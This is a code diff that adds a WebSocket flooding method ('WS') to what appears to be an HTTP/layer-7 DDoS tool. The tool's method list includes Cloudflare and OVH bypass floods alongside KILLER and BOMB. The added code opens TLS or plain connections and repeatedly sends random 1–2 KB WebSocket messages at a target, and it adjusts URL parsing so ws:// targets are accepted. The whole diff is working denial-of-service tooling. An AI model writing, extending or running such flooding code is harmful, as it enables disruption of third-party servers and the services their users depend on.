@@ -36,6 +36,11 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
+from random import randint, choice
+from websocket import create_connection
+import websocket
+import string
+
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -116,7 +121,7 @@ def exit(*message):
 class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
-        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
+        "NULL", "COOKIE", "PPS", "WS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
     }
 
@@ -208,6 +213,10 @@ class Tools:
         BYTES_SEND += len(packet)
         REQUESTS_SENT += 1
         return True
+    
+    @staticmethod
+    def randstr(strlen, chars=string.ascii_letters):
+        return ''.join(choice(chars) for _ in range(strlen))
 
     @staticmethod
     def sendto(sock, packet, target):
@@ -702,6 +711,7 @@ class HttpFlood(Thread):
             "DOWNLOADER": self.DOWNLOADER,
             "BOMB": self.BOMB,
             "PPS": self.PPS,
+            "WS": self.WS,
             "KILLER": self.KILLER,
         }
 
@@ -817,6 +827,12 @@ class HttpFlood(Thread):
                                    server_side=False,
                                    do_handshake_on_connect=True,
                                    suppress_ragged_eofs=True)
+        if self._target.scheme.lower() == "wss":
+            sock = ctx.wrap_socket(sock,
+                                   server_hostname=host[0] if host else self._target.host,
+                                   server_side=False,
+                                   do_handshake_on_connect=True,
+                                   suppress_ragged_eofs=True)
         return sock
 
     @property
@@ -828,7 +844,7 @@ class HttpFlood(Thread):
     @staticmethod
     def getMethodType(method: str) -> str:
         return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
-                                            "DYN", "SLOW", "PPS", "APACHE",
+                                            "DYN", "SLOW", "PPS", "WS", "APACHE",
                                             "BOT", "RHEX", "STOMP"} \
             else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
@@ -922,6 +938,21 @@ class HttpFlood(Thread):
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
+
+    def _send(self, data):
+        return Tools.send(self.sock, data)
+    
+    def WS(self) -> None:
+        s = None
+        
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                ws = websocket.WebSocket()
+                ws.connect(self._target,socket=s)
+                ws.send(Tools.randstr(randint(1024, 2048)))
+                #ws.close()
+        Tools.safe_close(s)
+
 
     def KILLER(self) -> None:
         while True:
@@ -1565,7 +1596,10 @@ if __name__ == '__main__':
             event.clear()
             target = None
             urlraw = argv[2].strip()
-            if not urlraw.startswith("http"):
+            if method == "WS" and not urlraw.startswith("ws"):
+                urlraw = "ws://" + urlraw
+
+            if not urlraw.startswith("http") and not urlraw.startswith("ws"):
                 urlraw = "http://" + urlraw
 
             if method not in Methods.ALL_METHODS:
